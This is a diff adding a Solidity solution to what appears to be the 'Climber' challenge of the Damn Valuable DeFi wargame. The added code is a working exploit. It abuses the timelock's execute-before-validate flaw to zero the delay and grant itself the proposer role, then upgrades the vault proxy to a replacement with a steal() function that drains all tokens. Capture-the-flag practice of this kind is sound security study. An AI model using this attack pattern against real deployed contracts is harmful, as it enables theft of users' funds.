@@ -7,6 +7,7 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +86,9 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        AttackContract attackContract = new AttackContract(timelock, vault);
+        timelock.execute(attackContract.targets(), attackContract.values(), attackContract.dataElements(), bytes32(""));
+        ReplacementVault(address(vault)).steal(address(token), recovery);
     }
 
     /**
@@ -94,5 +97,55 @@ contract ClimberChallenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract AttackContract {
+    ClimberTimelock victimTimeLock;
+    ClimberVault victimVault;
+    ReplacementVault replacementVault;
+
+    uint256 numOperations = 4;
+
+    constructor(ClimberTimelock victimTimeLock_, ClimberVault victimVault_) {
+        victimTimeLock = victimTimeLock_;
+        victimVault = victimVault_;
+
+        replacementVault = new ReplacementVault();
+    }
+
+    function targets() public view returns (address[] memory targets_) {
+        targets_ = new address[](numOperations);
+        targets_[0] = address(victimTimeLock);
+        targets_[1] = address(victimTimeLock);
+        targets_[2] = address(this);
+        targets_[3] = address(victimVault);
+    }
+
+    function values() public view returns (uint256[] memory values_) {
+        values_ = new uint256[](numOperations);
+    }
+
+    function dataElements() public view returns (bytes[] memory dataElements_) {
+        dataElements_ = new bytes[](numOperations);
+        dataElements_[0] = abi.encodeWithSelector(victimTimeLock.updateDelay.selector, 0);
+        dataElements_[1] = abi.encodeWithSelector(victimTimeLock.grantRole.selector, PROPOSER_ROLE, address(this));
+        dataElements_[2] = abi.encodeWithSelector(this.attack.selector);
+        dataElements_[3] = abi.encodeWithSelector(victimVault.upgradeToAndCall.selector, address(replacementVault), "");
+    }
+
+    function attack() public {
+        victimTimeLock.schedule(
+            targets(),
+            values(),
+            dataElements(),
+            bytes32("")
+        );
+    }
+}
+
+contract ReplacementVault is ClimberVault {
+    function steal(address token, address thief) external {
+        SafeTransferLib.safeTransferAll(token, thief);
     }
 }
